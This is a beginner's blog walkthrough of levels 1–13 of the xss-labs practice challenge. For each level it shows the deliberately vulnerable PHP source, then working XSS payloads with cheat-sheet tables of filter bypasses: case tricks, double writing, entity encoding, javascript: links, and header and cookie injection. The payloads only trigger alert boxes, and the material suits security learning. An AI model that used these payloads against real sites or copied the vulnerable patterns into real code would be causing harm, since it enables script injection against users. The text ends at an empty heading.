---
title: "Xss-labs Full Walkthrough & XSS Notes"
publishDate: 2025-12-26 18:37:00
description: "Analysis and Notes"
tags: ["XSS", "Notes", "Web"]
language: "English"

---

> Notes compiled by a beginner for learning and reference. I am not a professional; please forgive any oversights. Acknowledgments to others and AI assistance where applicable.
> 
> I chose to present the source code directly (normally you cannot see the full backend source, only the page source). On one hand, this saves space used by trial-and-error payloads; on the other hand, it makes it more intuitive for future review without needing to run other tools. I believe most filtering methods can be discovered through testing—just try a few more times. (Okay, actually, I don't think anyone else will read this; it's mostly for my own review.)

## Level 1

 Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.Analyzing from top to bottom, we can see that `window.alert `has been overridden by a custom function.

```php
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
```

2.We can see PHP code inserted into the HTML code.

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

Here, `ini_set("display_errors", 0);` is used to suppress error messages.

Then, the value of **name** is obtained via a GET request and assigned to `$str`.

```php
echo "<h2 align=center>欢迎用户".$str."</h2>";
```

Clearly, this is our injection point. The passed value is inserted directly without any filtering.

3.We can simply construct a payload:

```html
?name=<script>alert(1)</script> //这里 alert()里面随便写什么都行
```

### Several Ways to Execute JS Code

| **Method**             | **Payload Example**            | **Applicable Scenario**         | **Remarks**                                       |
| ---------------------- | ------------------------------ | ------------------------------- | ------------------------------------------------- |
| **Standard Tags**      | `<script>alert(1)</script>`    | No filtering, direct output     | Most easily blocked                               |
| **Image Error**        | `<img src=1 onerror=alert(1)>` | `<script>` is filtered          | **Most common in combat**, triggers automatically |
| **Interaction Events** | `<div onmouseover=alert(1)>`   | `src` or `script` filtered      | Requires user interaction                         |
| **Pseudo-protocols**   | `<a href=javascript:alert(1)>` | Injection point inside `a` tag  | Common in clickable links                         |
| **SVG Tags**           | `<svg/onload=alert(1)>`        | Modern browsers, `img` filtered | HTML5 feature                                     |

## Level 2

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

* The core goal is still to trigger the alert method.

* Focusing on the `htmlspecialchars` function, we can see that the `h2` tag cannot be used as an injection point for the following reasons.

### htmlspecialchars

The **htmlspecialchars** method converts **predefined characters** into **HTML entities**. Simply put, it turns code symbols with "functional meaning" into pure "text display symbols". The browser sees the entity and only displays it, rather than executing it as code.

| **Input Character** | **Converted Entity** | **Meaning**                                |
| ------------------- | -------------------- | ------------------------------------------ |
| `&`                 | `&amp;`              | Ampersand                                  |
| `"`                 | `&quot;`             | **Double Quote** (Key point)               |
| `<`                 | `&lt;`               | Less than (Directly kills `<script>` tags) |
| `>`                 | `&gt;`               | Greater than                               |

By default (before PHP 8.1), it does not convert single quotes (`'`)!

The full syntax of this function is: `htmlspecialchars(string, flags, encoding)`

The `flags` parameter determines its defense level:

* **`ENT_COMPAT` (Old default):** Converts double quotes, **preserves single quotes**.

* **`ENT_QUOTES`:** Converts both double and single quotes.

* **`ENT_NOQUOTES`:** Converts neither.

Developers often lazily call `htmlspecialchars($str)` without adding the `ENT_QUOTES` parameter. **This gives us the opportunity to bypass it using "single quotes" for closure.**

3.Injection Point

```html
<input name=keyword  value="'.$str.'">
```

It is still direct concatenation (inside the input box). This `input` is insecure. Analysis shows we can close the first `"` after `value=` and insert our code.

4.We can construct the simplest payload. We can choose `input` attributes to insert.

```php
" onclick="alert(1) // Note there is only one " at the beginning to close the previous one, and pay attention to spaces
```

If you just want to pass the level, this is enough. Below are more diverse options.

Similarly, we can choose other attributes.

### `<input>` Tag XSS Trigger Attribute Cheat Sheet

| **Attribute**          | **Trigger Condition**                                            | **Payload Example**                         | **CTF/Real World Recommendation & Rating**                                                                                                                      |
| ---------------------- | ---------------------------------------------------------------- | ------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`onfocus`**          | **Triggered when the input field gets focus.**                   | `" onfocus=alert(1) autofocus="`            | Adding `autofocus` makes it focus automatically after page load, achieving **"Zero-click"** automatic XSS. However, it can easily cause infinite loops/freezes. |
| **`onmouseover`**      | **Triggered when the mouse pointer moves over the input.**       | `" onmouseover=alert(1) "`                  | Requires the user to hover. If the input box is large or conspicuous, the success rate is decent, but not as stable as automatic triggers.                      |
| **`onclick`**          | **Triggered when the user clicks the input.**                    | `" onclick=alert(1) "`                      | Requires active user click. This is the most passive method unless combined with social engineering to induce clicks.                                           |
| **`oninput`**          | **Triggered when the user types/modifies content in the input.** | `" oninput=alert(1) "`                      | Requires user input. Usually used in search boxes where users must type.                                                                                        |
| **`onchange`**         | **Triggered when content changes and focus is lost.**            | `" onchange=alert(1) "`                     | Harder to trigger; requires changing content and clicking elsewhere. Conditions are too strict.                                                                 |
| **`onblur`**           | **Triggered when the input loses focus.**                        | `" onblur=alert(1) autofocus="`             | Can be combined with `autofocus`. Once the user clicks elsewhere on the page (losing focus), it triggers.                                                       |
| **`oncut` / `oncopy`** | **Triggered when user cuts/copies content.**                     | `" value="Click to copy" oncopy=alert(1) "` | Useful only in very specific scenarios (e.g., inducing users to copy redemption codes).                                                                         |

> Note: There is basically a space before and after the `"` here.

Regarding the closure with `"`, there are other styles available, see the table below:

| **Style Type**           | **Example**          | **Rules & Limits**                                                                      |
| ------------------------ | -------------------- | --------------------------------------------------------------------------------------- |
| **Double Quote Wrapped** | `onclick="alert(1)"` | Standard style. Value can contain spaces, single quotes.                                |
| **Single Quote Wrapped** | `onclick='alert(1)'` | Standard style. Value can contain spaces, double quotes.                                |
| **Unquoted**             | `onclick=alert(1)`   | **As long as the value doesn't contain "destructive characters", quotes are optional.** |

What are "Destructive Characters"?

If you want to use the **Unquoted** style (`onclick=payload`), your payload **absolutely cannot contain** the following characters, otherwise the HTML parser will think the attribute value has ended:

* **Space** (Most critical limit)

* `"` (Double quote)

* `'` (Single quote)

* `=` (Equals sign)

* `<` (Less than)

* `>` (Greater than)

* `` ` `` (Backtick)

This level is relatively simple as it doesn't escape the content inside the input. We can also consider **Tag Escape** and **Pseudo-protocols**.

### Tag Escape

The backend **did not** escape/filter angle brackets `<` and `>`. **Attack Principle**: Use `>` to forcibly close the current `<input>` tag, then freely insert new HTML tags.

| **Attack Variant**          | **Condition**                                                                     | **Payload Example**                     | **Principle Analysis**                                                                                              |
| --------------------------- | --------------------------------------------------------------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| **Direct Script Insertion** | Ideal case, backend only checked quote closure, ignored tags.                     | `"> <script>alert(1)</script>`          | 1. `">` closes original input.<br>2. Browser executes the full JS script block.                                     |
| **Using img/svg**           | Backend filters `<script>` keyword, but not `< >`.                                | `"> <img src=x onerror=alert(1)>`       | 1. `">` closes original input.<br>2. Triggers `onerror` to execute JS due to image load failure (src=x).            |
| **Using body/iframe**       | Need more stealth or specific context, or `img` is monitored.                     | `"> <iframe onload=alert(1)>`           | 1. `">` closes original input.<br>2. Triggers `onload` when iframe finishes loading.                                |
| **Using input (Recursive)** | You want a popup but don't want to break page structure; looks like a normal box. | `"> <input onfocus=alert(1) autofocus>` | 1. `">` closes original input.<br>2. Insert a new input tag with attack attributes. Can still cause infinite loops. |

### Pseudo-protocols and Special Types

Unable to use `<script>` tags, and common `on*` events (like `onclick`, `onmouseover`) are filtered by WAF, but modifying the `type` attribute or URL-related attributes is allowed. **Attack Principle**: Utilize the browser's support for `javascript:` pseudo-protocols to disguise JS code as links or form submission targets.

| **Attack Variant**              | **Condition**                                                               | **Payload Example**                                | **Principle Analysis**                                                                                                                                                                                  |
| ------------------------------- | --------------------------------------------------------------------------- | -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Form Hijacking (Submit)**     | It's an input box, but you can change its `type` to `submit`.               | `" type="submit" formaction="javascript:alert(1)"` | 1. `type="submit"` transforms input into a submit button.<br>2. `formaction` overrides the original form action.<br>3. Click button -> Browser tries to jump to `javascript:alert(1)` -> Code executes. |
| **Image Button (Image)**        | Another way to turn input into a button (Older but works in some browsers). | `" type="image" src="javascript:alert(1)"`         | 1. `type="image"` makes it an image button.<br>2. Clicking attempts to execute pseudo-protocol code in src.<br>_(Note: Modern browsers defend this heavily, success rate lower than formaction)_        |
| **Hyperlink Hijacking (A Tag)** | **(Extension)** If your input is inside `<a href="...">` instead of input.  | `" href="javascript:alert(1)"`                     | 1. Directly close the preceding quote.<br>2. Clicking link triggers JS.<br>_(Common in href attribute injection scenarios)_                                                                             |

### Bypassing Filters

Not necessary or applicable for this level, but good to know.

When simple `onclick` or `<script>` is mercilessly blocked, replaced, or deleted by WAF (Firewall) or backend code.

| **Technique**               | **Condition**                                                                                                  | **Payload Example**                                                 | **Principle & Evaluation**                                                                                                                     |
| --------------------------- | -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| **Case Sensitivity Bypass** | Backend filter code **only matches lowercase**.<br>Ex: `str_replace("script", "", $str)`                       | `" OnIcK=alert(1) "<br>"> <ScRiPt>alert(1)</sCrIpT>`                | HTML is **case-insensitive** for tags and attributes, but backend filter code (PHP/Python/Java) might be case-sensitive.                       |
| **Double Writing Bypass**   | Backend replaces sensitive words **with empty string**, and **only once**.<br>Ex: Replaces `script` with `""`. | `"> <scrscriptipt>alert(1)</script>`<br>`" oonnfocus=alert(1) "`    | When the middle `script` is deleted, the remaining characters on left and right automatically combine to form `script` again.                  |
| **HTML Entity Encoding**    | Backend filters `alert`, `(`, etc., but not `&` and `#`.                                                       | `" onclick=&#97;lert(1) "`<br>`" onclick=alert&#40;1&#41; "`        | Browser parsing order: **HTML Decode -> JS Execute**. Browser sees `&#97;`, restores it to `a`, then hands it to JS engine to execute `alert`. |
| **Space Bypass**            | Backend filters spaces via Regex, preventing attribute separation.                                             | `"onfocus=alert(1)autofocus="`<br>`"type="text"/onfocus=alert(1)/*` | HTML parser allows using `/` (slash) instead of space to separate attributes.                                                                  |
| **Protocol Bypass**         | `javascript:` keyword is filtered.                                                                             | `" type="submit" formaction="java&#115;cript:alert(1)"`             | Use HTML entity encoding to break the keyword. `&#115;` is `s`; browser decodes it and still recognizes `javascript:`.                         |
| **Equivalent Function Sub** | `alert()` function is precisely banned.                                                                        | `confirm(1)`<br>`prompt(1)`<br>`top['al'+'ert'](1)`                 | Popups don't have to be `alert`; `confirm` and `prompt` work too. Or use JS string concatenation to bypass keyword detection.                  |

## Level 3

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>    
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.Still triggering `alert`, won't elaborate.

2.Just like Level 2, the `echo` in h2 is escaped.

```php
<input name=keyword  value='".htmlspecialchars($str)."'>  
```

However, unlike the previous level where `$str` was passed directly, this level passes it through `htmlspecialchars`. [Click here to jump to htmlspecialchars](#htmlspecialchars)

Here we use its default behavior of not converting single quotes, and the problem explicitly hints at this by using `'`.

The rest is similar to the default payload of Level 2.

3.We can simply construct:

```php
' onclick='alert(1) 
```

Other attributes can be found [here](#input-tag-xss-trigger-attribute-cheat-sheet). Basically, the only difference is between single and double quotes.Also, try [Pseudo-protocols and Special Types](#pseudo-protocols-and-special-types); most should work.

## Level 4

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level5.php?keyword=find a way out!"; 
}
</script>
<title>欢迎来到level4</title>
</head>
<body>
<h1 align=center>欢迎来到level4</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>

```

1.Trigger `alert`.

2.Only `<` and `>` are filtered, and no escaping is performed. We can use `"` to close. This makes it easy; we can continue to mindlessly loop through [Attributes](#input-tag-xss-trigger-attribute-cheat-sheet).

```php
" onclick ="alert(1) 
```

## Level 5

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>


```

1.Trigger `alert`.

2.Here, uppercase is forcibly converted to lowercase, proving we cannot use Case Sensitivity Bypass.

```php
$str = strtolower($_GET["keyword"]);
```

3.We can see `<script` is replaced with `<scr_ipt` and `on` is replaced with `o_n`.

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

3.Here we can combine [Pseudo-protocols and Special Types](#pseudo-protocols-and-special-types) and [Tag Escape](#tag-escape). We can construct:

```php
"> <a href="javascript:alert(1)">Click to pass</a>
```

4.Besides the casing replacement and keyword replacement (like `on` replacement in formaction) mentioned in the source code, there is another payload type issue related to browser security mechanisms.

Using image tags like `<input type="image" src="javascript:alert(1)">` or `<img src="javascript:alert(1)">` successfully bypasses all PHP filters and sends complete code to the browser.

**However**:

1. The browser sees the tag is `img` or `input type="image"`.

2. The browser thinks: "This is a static resource (image), its `src` should be a URL address."

3. The browser **prohibits** executing JS code in the `src` attribute of image resources.

4. The browser tries to load this "image," fails, shows a broken image icon, and **code is not executed**.

This means in modern browsers, `src` in image attributes will never execute scripts.

`<a>` is obviously the optimal solution.

## Level 6

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level7.php?keyword=move up!"; 
}
</script>
<title>欢迎来到level6</title>
</head>
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>


```

1.As seen, the replacements here are numerous and terrifying.

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
```

However, notice that it lacks the conversion to lowercase from the previous level. It becomes very simple: [Bypassing Filters](#bypassing-filters)

2.We can construct as follows:

```php
" Onclick="alert(1) // Randomly change case for specific keywords
```

Others are omitted.

## Level 7

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>

```

1.Here, the case sensitivity loophole from Level 6 is patched, and attributes (keywords of attributes) are basically filtered (replaced with empty string).

```php
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
```

2.[Bypassing Filters](#bypassing-filters). We can consider Double Writing Bypass.

For example, `script`, `href`, `onclick` can all be considered and used.

```php
" oonnclick="alert(1)
```

> Note ⚠️: Double writing here is not `ononclick`; writing it like that is useless no matter how many times. The goal is to have the middle part replaced by empty, letting the head and tail connect.

## Level 8

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>

```

1.The filtering in this level basically patches all previous holes: case sensitivity, keyword replacement, and even `"` is forcibly escaped.

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

2.The injection point for this level is not the original input box, but below it.

```php
echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
```

The input `$str7` is placed directly into the `href` attribute of the `<a>` tag. **This means:** We don't need to "escape" to close the tag; we are already in a place where JS can be executed (`href` attribute supports `javascript:` pseudo-protocol).

The `href` attribute has a property: it performs **HTML decoding** first, restores the characters, and then executes.

3.Thus we can construct:

```html
javasc&#114;ipt:alert(1)
```

### HTML Entity Encoding

This mainly targets PHP which won't perform HTML decoding, allowing bypass of filters, while `href` automatically decodes.

| **Method**                         | **Payload Code**                                                                                                   | **Remarks**                                                 |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------- |
| **Single Character (Recommended)** | `javasc&#114;ipt:alert(1)`                                                                                         | Only change one letter `r`, shortest and fastest.           |
| **Head Character**                 | `java&#115;cript:alert(1)`                                                                                         | Only change letter `s`.                                     |
| **Insert Tab**                     | `javasc&#9;ript:alert(1)`                                                                                          | Utilize `&#9;` (Tab key) to break the word.                 |
| **Full Encoding** <br>             | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;`<br>`&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;` | **Line 1 is** `javascript:`<br>**Line 2 is** `alert(1)`<br> |

## Level 9

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

1.The overall logic is the same as Level 8, using the friendly link.

2.But here a check is added to see if our input link is valid, meaning direct pseudo-protocol + encoding from the previous level is invalid.

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

Analyzing this, it only checks if the passed parameter contains `http://`. This means we can insert it anywhere.

3.So we can construct based on the previous level, using `//` comment to make the subsequent part ineffective.

```php
javasc&#114;ipt:alert(1) // http://
```

Thinking differently, we don't even need comments; simply insert it into `alert()`. Note that you must use `'` to wrap it here.

```php
javasc&#114;ipt:alert('http://')
```

## Level 10

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.This level relies on passing parameters to construct the payload, but the problem is, what do we pass parameters to?

2.Checking the page source, we see three hidden `input` tags.

```php
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
```

We might as well pass parameters to all three, for example:

```php
t_link=1&t_history=1&t_sort=1
```

From this, we discover the injection point is `t_sort`.

3.Now we can construct just like before.

```php
t_sort=" type="text" onclick="alert(1) 
```

| **Obstacle**                    | **Solution**                                                                                      |
| ------------------------------- | ------------------------------------------------------------------------------------------------- |
| **Cannot find injection point** | Read source (or blind guess), find hidden `t_sort` parameter.                                     |
| **Filters `< >`**               | Give up tag escape, switch to **Attribute Injection** (adding attributes inside the tag).         |
| **`type="hidden"`**             | Inject `type="text"` to overwrite original attribute, making the element visible for interaction. |

## Level 11

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.Judging from the source code analysis, this level is full of smoke screens (it's really impressive if you can solve this without seeing source code; I certainly couldn't guess it).

```php
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
```

No matter what you pass to the four variables given in the problem, it's useless...

2.The entry point of the problem lies in the HTTP request header.

```php
$str11=$_SERVER['HTTP_REFERER'];
```

Following this, we can see simple filtering for `<` and `>`. So we need some auxiliary tools, such as **Hackbar**, **BurpSuite**, etc.

3.For example, use BurpSuite to capture the packet and add directly to the end:

```
Referer: " onclick = alert(1) type="text
```

## Level 12

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

1.Very similar to the previous level, just changed `Referer` to `User-Agent`.

2.Still use BurpSuite to capture packets, find `User-Agent` and construct:

```
User-Agent:" onclick = alert(1) type="text
```

## Level 13

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.No difference from the previous two levels, this time it changed to `cookie`.

2.The source code writes as follows. Even without seeing source code, capturing packets via BP (BurpSuite) reveals clear clues.

```php
setcookie("user", "call me maybe?", time()+3600);
```

```
Cookie: user=call+me+maybe%3F  
```

The problem hints at modifying the user value to achieve injection.

3.The rest is no different from the above levels.

```
Cookie: user=" onclick = alert(1) type="text
```

### HTTP Header Injection

